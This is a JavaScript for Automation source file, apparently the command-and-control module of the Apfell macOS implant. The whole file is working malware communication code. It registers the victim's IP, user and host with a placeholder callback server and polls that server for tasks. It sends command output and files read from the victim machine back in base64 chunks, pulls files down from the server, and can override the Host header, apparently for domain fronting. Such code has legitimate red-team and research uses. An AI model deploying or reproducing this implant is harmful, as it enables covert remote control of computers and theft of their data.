//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{
	constructor(interval, baseurl){
		super(interval, baseurl);
		this.commands = [];
		this.host_header = "YYY";
	}
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
		return JSON.stringify({'baseurl': this.baseurl, 'interval': this.interval, 'killdate': '', 'commands': this.commands.join(",")}, null, 2);
	}
	setConfig(params){
		//A RESTful base config has 3 updatable components
		//  BaseURL (includes Port), CallbackInterval, and KillDate (not implemented yet)
		if(params['commands'] != undefined){
		    this.commands = params['commands'];
		}
	}
	checkin(ip, pid, user, host){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		//gets back a unique ID
		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
		//calls htmlPostData(url,data) to actually checkin
		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));
		apfell.id = jsondata.id;
		// if we fail to get a new ID number, then exit the application
		if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
		return jsondata;
	}
	getTasking(){
		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
		while(true){
		    try{
		        var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
		        var task = this.htmlGetData(url);
		        return JSON.parse(task);
		    }
		    catch(error){
		        $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
		    }
		}

	}
	postResponse(task, output){
	    // this will get the task object and the response output
	    return this.postRESTResponse("api/v1.0/responses/" + task.id, output);
	}
	postRESTResponse(urlEnding, data){
		//depending on the amount of data we're sending, we might need to chunk it
		var size= 512000;
		var offset = 0;
		//console.log("total response size: " + data.length);
		do{
		    var csize = data.length - offset > size ? size : data.length - offset;
		    var dataChunk = data.subdataWithRange($.NSMakeRange(offset, csize));
		    var encodedChunk = dataChunk.base64EncodedStringWithOptions(0).js;
		    offset += csize;
		    var postData = {"response": encodedChunk};
		    var jsondata = this.htmlPostData(urlEnding, JSON.stringify(postData));
		}while(offset < data.length);

		return jsondata;
	}
	htmlPostData(urlEnding, sendData){
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				var url = this.baseurl + urlEnding;
				//console.log(url);
				var data = $.NSString.alloc.initWithUTF8String(sendData);
				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				var postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				if( this.host_header.length > 3){
				    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
				}
				req.setHTTPBody(postData);
				var response = Ref();
				var error = Ref();
				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				var resp = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
				//console.log(resp);
				var jsondata = JSON.parse(resp);
				return jsondata;
			}
			catch(error){
			    $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
			}
		}
	}
	htmlGetData(url){
	    while(true){
	        try{
	            var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
                req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
                if( this.host_header.length > 3){
                    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
                }
                var response = Ref();
                var error = Ref();
                var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
                return ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
	            //var data = ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
	            //return data;
	        }
	        catch(error){
	            $.NSThread.sleepForTimeInterval(this.interval); //wait timeout seconds and try again
	        }
	    }
	}
	download(task, params){
        // download just has one parameter of the path of the file to download
        if( does_file_exist(params)){
            var offset = 0;
            var url = "api/v1.0/responses/" + task.id;
            var chunkSize = 512000; //3500;
            var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
            // Get the file size by seeking;
            var fileSize = handle.seekToEndOfFile;
            // always round up to account for chunks that are < chunksize;
            var numOfChunks = Math.ceil(fileSize / chunkSize);
            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
            var registerData = convert_to_nsdata(registerData);
            var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
            //var registerFile = this.postResponse(task, registerData);
            if (registerFile['status'] == "success"){
                handle.seekToFileOffset(0);
                var currentChunk = 1;
                var data = handle.readDataOfLength(chunkSize);
                while(parseInt(data.length) > 0 && offset < fileSize){
                    // send a chunk
                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
                    fileData = convert_to_nsdata(fileData);
                    this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}))
                    //this.postResponse(task, fileData);
                    $.NSThread.sleepForTimeInterval(this.interval);

                    // increment the offset and seek to the amount of data read from the file
                    offset += parseInt(data.length);
                    handle.seekToFileOffset(offset);
                    currentChunk += 1;
                    data = handle.readDataOfLength(chunkSize);
                }
                var output = "Finished downloading file with id: " + registerFile['file_id'];
                output += "\nBrowse to /api/v1.0/files/" + registerFile['file_id'];
            }
            else{
               var output = "Failed to register file to download";
            }
        }
        else{
            var output = "file does not exist";
        }
        return output;
	}
	upload(task, params){
	    try{
	        var url = "api/v1.0/files/" + params;
            var file_data = this.htmlGetData(this.baseurl + url);
            var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
            //var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
            return decoded_data;
            //var output = write_data_to_file(decoded_data, file_path);
            //return output;
	    }catch(error){
	        return error.toString();
	    }

	}
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
C2 = new customC2(callback_interval, "callback_host:callback_port/");